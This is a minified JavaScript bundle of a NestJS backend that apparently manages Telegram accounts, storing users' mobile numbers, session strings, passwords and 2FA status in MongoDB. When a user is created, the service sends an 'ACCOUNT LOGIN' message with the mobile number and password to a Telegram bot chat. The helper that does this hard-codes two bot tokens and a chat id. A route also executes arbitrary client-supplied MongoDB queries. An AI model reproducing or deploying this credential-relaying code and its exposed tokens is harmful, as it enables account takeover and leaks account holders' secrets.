status",type:Boolean}),(0,a.Transform)((({value:e})=>"true"===e||!0===e)),(0,s.IsOptional)(),(0,s.IsBoolean)(),n("design:type",Boolean)],c.prototype,"demoGiven",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by messages count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"msgs",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by total chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"totalChats",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by last active timestamp"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",String)],c.prototype,"lastActive",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by movie count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"movieCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"photoCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"videoCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by gender"}),(0,s.IsOptional)(),(0,s.IsString)(),n("design:type",String)],c.prototype,"gender",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by other photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"otherPhotoCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by other video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"otherVideoCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by own photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"ownPhotoCount",void 0),i([(0,r.ApiPropertyOptional)({description:"Filter by own video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),n("design:type",Number)],c.prototype,"ownVideoCount",void 0)},9732:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDto=void 0;const i=o(8073),n=o(9631);class r extends((0,i.PartialType)(n.CreateUserDto)){}t.UpdateUserDto=r},6093:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.UserSchema=t.User=void 0;const r=o(5839),a=o(6037),s=o(9742);let c=class{constructor(){this.twoFA=!1,this.expired=!1,this.password=null}};t.User=c,i([(0,s.ApiProperty)(),(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],c.prototype,"mobile",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],c.prototype,"session",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",String)],c.prototype,"firstName",void 0),i([(0,s.ApiProperty)({required:!1}),(0,r.Prop)(),n("design:type",String)],c.prototype,"lastName",void 0),i([(0,s.ApiProperty)({required:!1}),(0,r.Prop)(),n("design:type",String)],c.prototype,"username",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"channels",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"personalChats",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Boolean)],c.prototype,"demoGiven",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"msgs",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"totalChats",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",String)],c.prototype,"lastActive",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],c.prototype,"tgId",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"movieCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"photoCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"videoCount",void 0),i([(0,s.ApiProperty)({required:!1}),(0,r.Prop)(),n("design:type",String)],c.prototype,"gender",void 0),i([(0,r.Prop)({required:!1,type:Boolean}),n("design:type",Boolean)],c.prototype,"twoFA",void 0),i([(0,r.Prop)({required:!1,type:Boolean,default:!1}),n("design:type",Boolean)],c.prototype,"expired",void 0),i([(0,r.Prop)({required:!1}),n("design:type",String)],c.prototype,"password",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"otherPhotoCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"otherVideoCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"ownPhotoCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"ownVideoCount",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)(),n("design:type",Number)],c.prototype,"contacts",void 0),i([(0,s.ApiProperty)(),(0,r.Prop)({type:a.default.Schema.Types.Mixed,default:{outgoing:0,incoming:0,video:0,chatCallCounts:[],totalCalls:0}}),n("design:type",Object)],c.prototype,"calls",void 0),i([(0,s.ApiPropertyOptional)(),(0,r.Prop)({type:a.default.Schema.Types.Mixed,default:[],required:!1}),n("design:type",Array)],c.prototype,"recentUsers",void 0),t.User=c=i([(0,r.Schema)({collection:"users",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],c),t.UserSchema=r.SchemaFactory.createForClass(c)},8622:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersController=void 0;const a=o(3563),s=o(9127),c=o(9742),l=o(9879),p=o(9732),d=o(9631);let u=class{constructor(e){this.usersService=e}async create(e){return console.log("creating new user"),this.usersService.create(e)}async search(e){return this.usersService.search(e)}async findAll(){return this.usersService.findAll()}async findOne(e){return this.usersService.findOne(e)}async update(e,t){return this.usersService.update(e,t)}async remove(e){return this.usersService.delete(e)}async executeQuery(e){const{query:t,sort:o,limit:i,skip:n}=e;try{return await this.usersService.executeQuery(t,o,i,n)}catch(e){throw e}}};t.UsersController=u,i([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new user"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[d.CreateUserDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("/search"),(0,c.ApiOperation)({summary:"Search users based on various parameters"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[l.SearchUserDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all users"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)(":tgId"),(0,c.ApiOperation)({summary:"Get a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":tgId"),(0,c.ApiOperation)({summary:"Update a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,p.UpdateUserDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Delete)(":tgId"),(0,c.ApiOperation)({summary:"Delete a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,c.ApiOperation)({summary:"Execute a custom MongoDB query"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UsersController=u=i([(0,c.ApiTags)("Telegram Users"),(0,a.Controller)("user"),n("design:paramtypes",[s.UsersService])],u)},7422:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersModule=void 0;const n=o(3563),r=o(5839),a=o(9127),s=o(8622),c=o(6093),l=o(282),p=o(8009),d=o(5774);let u=class{};t.UsersModule=u,t.UsersModule=u=i([(0,n.Module)({imports:[d.initModule,r.MongooseModule.forFeature([{name:"userModule",schema:c.UserSchema,collection:"users"}]),(0,n.forwardRef)((()=>l.TelegramModule)),(0,n.forwardRef)((()=>p.ClientModule))],controllers:[s.UsersController],providers:[a.UsersService],exports:[a.UsersService]})],u)},9127:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersService=void 0;const a=o(2995),s=o(3563),c=o(5839),l=o(6037),p=o(5562),d=o(6185);let u=class{constructor(e,t,o){this.userModel=e,this.telegramService=t,this.clientsService=o}async create(e){const t=this.telegramService.getActiveClientSetup();if(console.log("New User received - ",e?.mobile),console.log("ActiveClientSetup::",t),!t||t.newMobile!==e.mobile)return await(0,d.fetchWithTimeout)(`${(0,d.ppplbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${e.username?`@${e.username}`:e.firstName}\nMobile: t.me/${e.mobile}${e.password?`\npassword: ${e.password}`:"\n"}`)}`),new this.userModel(e).save();console.log("Updating New Session Details",e.mobile,e.username,t.clientId),await this.clientsService.updateClientSession(e.session)}async findAll(){return this.userModel.find().exec()}async findOne(e){const t=await((await this.userModel.findOne({tgId:e}).exec())?.toJSON());if(!t)throw new s.NotFoundException(`User with tgId ${e} not found`);return t}async update(e,t){delete t._id;const o=await this.userModel.updateMany({tgId:e},{$set:t},{new:!0,upsert:!0}).exec();if(0===o.matchedCount)throw new s.NotFoundException(`Users with tgId ${e} not found`);return o.modifiedCount}async updateByFilter(e,t){delete t._id;const o=await this.userModel.updateMany(e,{$set:t},{new:!0,upsert:!0}).exec();if(0===o.matchedCount)throw new s.NotFoundException(`Users with tgId ${JSON.stringify(e)} not found`);return o.modifiedCount}async delete(e){if(0===(await this.userModel.deleteOne({tgId:e}).exec()).deletedCount)throw new s.NotFoundException(`User with tgId ${e} not found`)}async search(e){return e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),void 0!==e.twoFA&&(e.twoFA="true"===e.twoFA||"1"===e.twoFA||!0===e.twoFA),console.log(e),this.userModel.find(e).sort({updatedAt:-1}).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const n=this.userModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}};t.UsersService=u,t.UsersService=u=i([(0,s.Injectable)(),r(0,(0,c.InjectModel)("userModule")),r(1,(0,s.Inject)((0,s.forwardRef)((()=>a.TelegramService)))),r(2,(0,s.Inject)((0,s.forwardRef)((()=>p.ClientService)))),n("design:paramtypes",[l.Model,a.TelegramService,p.ClientService])],u)},3924:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.LoggerMiddleware=void 0;const n=o(3563),r=o(6185);let a=class{constructor(){this.logger=new n.Logger("HTTP")}use(e,t,o){const{method:i,originalUrl:n,baseUrl:a}=e;var s;e.get("user-agent"),e.ip,s=n,["/sendtochannel","/favicon.","/tgsignup"].some((e=>s.startsWith(e)))||"/"===n?n.includes("Video")&&this.logger.log(`Excluded endpoint hit: ${n} (length: ${n.length})`):(t.on("finish",(()=>{const{statusCode:o}=t;t.get("content-length"),o>=500?((0,r.fetchWithTimeout)(`${(0,r.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${n} with ${o}`)}`),this.logger.error(`${i} ${n} ${e.ip} || StatusCode : ${o}`)):o>=400?((0,r.fetchWithTimeout)(`${(0,r.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${n} with ${o}`)}`),this.logger.warn(`${i} ${n} ${e.ip} || StatusCode : ${o}`)):o>=300?this.logger.verbose(`${i} ${n} ${e.ip} || StatusCode : ${o}`):this.logger.log(`${i} ${n} ${e.ip} || StatusCode : ${o}`)})),t.on("error",(e=>{const t=(0,r.parseError)(e,process.env.clientId);(0,r.fetchWithTimeout)(`${(0,r.ppplbot)()}&text=${encodeURIComponent(`Failed :: ${n} with ${t.message}`)}`)}))),o()}};t.LoggerMiddleware=a,t.LoggerMiddleware=a=i([(0,n.Injectable)()],a)},6185:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.defaultMessages=t.defaultReactions=void 0,t.sleep=function(e){return new Promise((t=>setTimeout(t,e)))},t.contains=function(e,t){return t.some((t=>!!e?.includes(t)))},t.fetchWithTimeout=async function(e,t={},o=1){t.timeout=t.timeout||5e4,t.method=t.method||"GET";const r=async(e,o)=>{const r=i.default.CancelToken.source(),a=setTimeout((()=>{r.cancel(`Request timed out after ${t.timeout}ms`)}),t.timeout);try{const n=await(0,i.default)({...t,url:e,headers:{"Content-Type":"application/json"},cancelToken:r.token,family:o});return clearTimeout(a),n}catch(t){if(clearTimeout(a),console.log(`Error at URL (IPv${o}): `,e),n(t),i.default.isCancel(t))return void console.log("Request canceled:",t.message,e);throw t}};for(let t=0;t<=o;t++)try{const t=await r(e,4);if(t)return t;const o=await r(e,6);if(o)return o}catch(r){console.log("Error at URL : ",e);const a=n(r);if(!(t<o&&"ERR_NETWORK"!==r.code&&"ECONNABORTED"!==r.code&&"ETIMEDOUT"!==r.code)||a.message.toLowerCase().includes("too many requests")||i.default.isCancel(r))return void console.log(`All ${o+1} retries failed for ${e}`);console.log(`Retrying... (${t+1}/${o})`),await new Promise((e=>setTimeout(e,2e3)))}},t.toBoolean=function(e){return"string"==typeof e?"true"===e.toLowerCase():"number"==typeof e?1===e:e},t.fetchNumbersFromString=function(e){const t=e.match(/\d+/g);return t?t.join(""):""},t.parseError=n,t.ppplbot=function(e,t){let o=t;return o||(o=r%2==1?"bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY":"bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA",r++),`https://api.telegram.org/${o}/sendMessage?chat_id=${e||"-1001801844217"}`},t.areJsonsNotSame=function(e,t){const o=["id","_id"];return!function e(t,i){if(t===i)return!0;if("object"!=typeof t||"object"!=typeof i||null===t||null===i)return!1;const n=Object.keys(t).filter((e=>!o.includes(e))).sort(),r=Object.keys(i).filter((e=>!o.includes(e))).sort();return n.length===r.length&&n.every((o=>e(t[o],i[o])))}(e,t)},t.mapToJson=function(e){const t={};for(const[o,i]of e.entries())t[String(o)]=i;return t};const i=o(8938);function n(e,t="TgCms"){let o="UNKNOWN",i="An unknown error occurred",n="UnknownError";const r=e=>{if(Array.isArray(e))return e.map((e=>r(e))).filter((e=>void 0!==e)).join(", ");if("string"==typeof e)return e;if("object"==typeof e&&null!==e){let t="";for(const o in e){const i=e[o];if(Array.isArray(e[o])&&e[o].every((e=>"string"==typeof e)))t+=e[o].join(", ");else{const e=r(i);e&&(t+=e)}}return t}return JSON.stringify(e)};if(e.response){const t=e.response;o=t.data?.status||t.status||e.status||"UNKNOWN",i=t.data?.message||t.data?.errors||t.errorMessage||t.message||t.statusText||t.data||e.message||"An error occurred",n=t.data?.error||t.error||e.name||e.code||"Error"}else e.request?(o=e.status||"NO_RESPONSE",i=e.data?.message||e.data?.errors||e.message||e.statusText||e.data||e.message||"The request was triggered but no response was received",n=e.name||e.code||"NoResponseError"):e.message?(o=e.status||"UNKNOWN",i=e.message,n=e.name||e.code||"Error"):e.errorMessage&&(o=e.status||"UNKNOWN",i=e.errorMessage,n=e.name||e.code||"Error");const a=`${t?`${t} ::`:""} ${r(i)} `,s={status:o,message:e.errorMessage||a,error:n};return console.log("RPCError"==s.error?s.message:s),s}let r=0;t.defaultReactions=["❤","🔥","👏","🥰","😁","🤔","🤯","😱","🤬","😢","🎉","🤩","🤮","💩","🙏","👌","🕊","🤡","🥱","🥴","😍","🐳","❤‍🔥","💯","🤣","💔","🏆","😭","😴","👍","🌚","⚡","🍌","😐","💋","👻","👀","🙈","🤝","🤗","🆒","🗿","🙉","🙊","🤷","👎"],t.defaultMessages=["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21"]},3563:e=>{e.exports=require("@nestjs/common")},3428:e=>{e.exports=require("@nestjs/config")},8781:e=>{e.exports=require("@nestjs/core")},8073:e=>{e.exports=require("@nestjs/mapped-types")},5839:e=>{e.exports=require("@nestjs/mongoose")},9556:e=>{e.exports=require("@nestjs/platform-express")},9742:e=>{e.exports=require("@nestjs/swagger")},4650:e=>{e.exports=require("adm-zip")},8938:e=>{e.exports=require("axios")},2041:e=>{e.exports=require("big-integer")},4922:e=>{e.exports=require("class-transformer")},7403:e=>{e.exports=require("class-validator")},1416:e=>{e.exports=require("cloudinary")},2559:e=>{e.exports=require("imap")},6037:e=>{e.exports=require("mongoose")},8461:e=>{e.exports=require("multer")},3047:e=>{e.exports=require("telegram")},7385:e=>{e.exports=require("telegram/Helpers")},9425:e=>{e.exports=require("telegram/Password")},8178:e=>{e.exports=require("telegram/client/uploads")},6969:e=>{e.exports=require("telegram/events")},5651:e=>{e.exports=require("telegram/extensions/Logger")},689:e=>{e.exports=require("telegram/sessions")},3820:e=>{e.exports=require("telegram/tl")},9896:e=>{e.exports=require("fs")},6928:e=>{e.exports=require("path")}},t={};function o(i){var n=t[i];if(void 0!==n)return n.exports;var r=t[i]={exports:{}};return e[i].call(r.exports,r,r.exports,o),r.exports}var i={};(()=>{var e=i;Object.defineProperty(e,"__esModule",{value:!0});const t=o(8781),n=o(6037),r=o(3205),a=o(9742),s=o(3563);!async function(){const e=await t.NestFactory.create(r.AppModule),o=(new a.DocumentBuilder).setTitle("NestJS and Express API").setDescription("API documentation").setVersion("1.0").build();e.use(((e,t,o)=>{t.header("Access-Control-Allow-Origin","*"),t.header("Access-Control-Allow-Methods","GET,PUT,POST,DELETE"),t.header("Access-Control-Allow-Headers","Content-Type, Accept"),o()})),e.enableCors({allowedHeaders:"*",origin:"*"});const i=a.SwaggerModule.createDocument(e,o);a.SwaggerModule.setup("api",e,i),n.default.set("debug",!0),e.useGlobalPipes(new s.ValidationPipe({transform:!0})),process.on("unhandledRejection",((e,t)=>{console.error("Unhandled Rejection at:",t,"reason:",e)})),process.on("uncaughtException",((e,t)=>{console.error(t,e)}));let c=!1;const l=async t=>{c||(c=!0,console.log(`${t} received`),await e.close(),process.exit(0))};process.on("exit",(async()=>{console.log("Application closed")})),process.on("SIGINT",(async()=>{await l("SIGINT")})),process.on("SIGTERM",(async()=>{await l("SIGTERM")})),process.on("SIGQUIT",(async()=>{await l("SIGQUIT")})),await e.init(),await e.listen(8e3)}()})();var n=exports;for(var r in i)n[r]=i[r];i.__esModule&&Object.defineProperty(n,"__esModule",{value:!0})})();
//# sourceMappingURL=index.js.map